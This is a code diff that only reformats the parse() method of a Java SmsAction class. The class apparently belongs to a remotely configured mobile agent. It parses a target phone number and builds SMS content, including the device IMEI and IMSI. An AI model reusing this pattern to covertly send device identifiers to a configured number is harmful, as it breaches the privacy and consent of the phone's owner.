@@ -138,8 +138,8 @@ public class SmsAction extends SubAction {
 	 * @return true, if successful
 	 */
 	protected boolean parse(final byte[] confParams) {
-		final DataBuffer databuffer = new DataBuffer(confParams, 0,
-				confParams.length);
+		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
+		
 		try {
 			type = databuffer.readInt();
 			Check.asserts(type >= 1 && type <= 3, "wrong type");
@@ -149,38 +149,40 @@ public class SmsAction extends SubAction {
 			number = Utils.Unspace(WChar.getString(buffer, true));
 
 			switch (type) {
-			case TYPE_TEXT:
-				len = databuffer.readInt();
-				buffer = new byte[len];
-				databuffer.read(buffer);
-				text = WChar.getString(buffer, true);
-				break;
-			case TYPE_LOCATION:
-				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-				break;
-			case TYPE_SIM:
-				final StringBuffer sb = new StringBuffer();
-				final Device device = Device.self();
-				if (Device.isCdma()) {
-
-					// sb.append("SID: " + device.getSid() + "\n");
-					// sb.append("ESN: "
-					// + NumberUtilities.toString(device.getEsn(), 16)
-					// + "\n");
-				} else {
-					sb.append("IMEI: " + device.getImei() + "\n");
-					sb.append("IMSI: " + device.getImsi() + "\n");
-				}
-
-				text = sb.toString();
-				break;
-			default:
-				Log.d(TAG,"Error: SmsAction.parse,  Unknown type: " + type);
-				break;
+				case TYPE_TEXT:
+					len = databuffer.readInt();
+					buffer = new byte[len];
+					databuffer.read(buffer);
+					text = WChar.getString(buffer, true);
+					break;
+					
+				case TYPE_LOCATION:
+					// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+					break;
+					
+				case TYPE_SIM:
+					final StringBuffer sb = new StringBuffer();
+					final Device device = Device.self();
+					if (Device.isCdma()) {
+	
+						// sb.append("SID: " + device.getSid() + "\n");
+						// sb.append("ESN: "
+						// + NumberUtilities.toString(device.getEsn(), 16)
+						// + "\n");
+					} else {
+						sb.append("IMEI: " + device.getImei() + "\n");
+						sb.append("IMSI: " + device.getImsi() + "\n");
+					}
+	
+					text = sb.toString();
+					break;
+					
+				default:
+					Log.d(TAG,"Error: SmsAction.parse,  Unknown type: " + type);
+					break;
 			}
 
 		} catch (final IOException e) {
-
 			return false;
 		}
 
